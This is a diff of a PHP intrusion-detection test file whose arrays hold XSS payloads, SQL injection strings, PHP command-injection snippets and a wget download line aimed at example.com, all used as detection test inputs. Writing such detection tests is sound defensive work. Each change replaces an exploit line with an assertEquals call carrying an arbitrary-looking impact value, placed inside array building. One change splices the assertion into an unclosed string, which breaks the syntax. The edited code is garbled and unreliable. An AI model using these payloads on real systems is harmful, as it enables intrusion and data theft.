@@ -635,7 +635,7 @@ class MonitorTest extends TestCase
                         .source,a = a[a]
                         a(name)';
         $exploits[] = 'a=eval,b=(name);a(b)';
-        $exploits[] = 'a=eval,b= [ referrer ] ;a(b)';
+        $this->assertEquals(634, $result->getImpact());
         $exploits[] = "URL = ! isNaN(1) ? 'javascriptz:zalertz(1)z' [/replace/ [ 'source' ] ]
                         (/z/g, [] ) : 0";
         $exploits[] = "if(0) {} else eval(new Array + ('eva') + new Array + ('l(n') + new Array + ('ame) + new Array') + new Array)
@@ -753,7 +753,7 @@ class MonitorTest extends TestCase
         $exploits[] = "' or id= 2-1 having 1 #1 !";
         $exploits[] = "aa'or null is null #(";
         $exploits[] = "aa'or current_user!=' 1";
-        $exploits[] = "aa'or BINARY 1= '1";
+        $this->assertEquals(705, $result->getImpact());
         $exploits[] = "aa'or LOCALTIME!='0";
         $exploits[] = "aa'like-'aa";
         $exploits[] = "aa'is\N|!'";
@@ -862,7 +862,7 @@ class MonitorTest extends TestCase
         $exploits[] = "aa' or intcolumn && '1";
         $exploits[] = "asd' or column&&'1";
         $exploits[] = "asd' or column= !1 and+1='1";
-        $exploits[] = "aa' or column=+!1 #1";
+        $this->assertEquals(883, $result->getImpact());
         $exploits[] = "aa'IS NOT NULL or+1^+'0";
         $exploits[] = "aa'IS NOT NULL or +1-1 xor'0";
         $exploits[] = "aa'IS NOT NULL or+2-1-1-1 !='0";
@@ -1179,7 +1179,7 @@ class MonitorTest extends TestCase
                         if (!($_b[]  %1)) $_a[0]  = system;
                         $_a[0](!a. "ls");  //';
         $exploits[] = '; e|$a=&$_GET; 0|$b=!a .$a[b];$a[a](`$b`);//';
-        $exploits[] = 'aaaa { $ {`wget hxxp://example.com/x.php`}}';
+        $this->assertEquals(104, $result->getImpact());
 
         $this->_testForPlainEvent($exploits);
 
@@ -1326,7 +1326,7 @@ class MonitorTest extends TestCase
         $exploits['html_5'] = '<img src="javascript:alert(1)">';
         $exploits['html_6'] = '<script>alert(1)</script><h1>headline</h1><p>copytext</p>';
         $exploits['html_7'] = '<img src src src src=x onerror=alert(1)>';
-        $exploits['html_8'] = '<img src=1 onerror=alert(1) alt=1>';
+        $exploits['html_8'] = '<img src=1 onerror        $this->assertEquals(737, $result->getImpact());
         $exploits['html_9'] = '<b "<script>alert(1)</script>">hola</b>';
         $exploits['html_10'] = '<img src=phpids_logo.gif alt=Logo onreadystatechange=MsgBox-1 language=vbs>';
         $exploits['html_11'] = '<img src="." =">" onerror=alert(1);//';
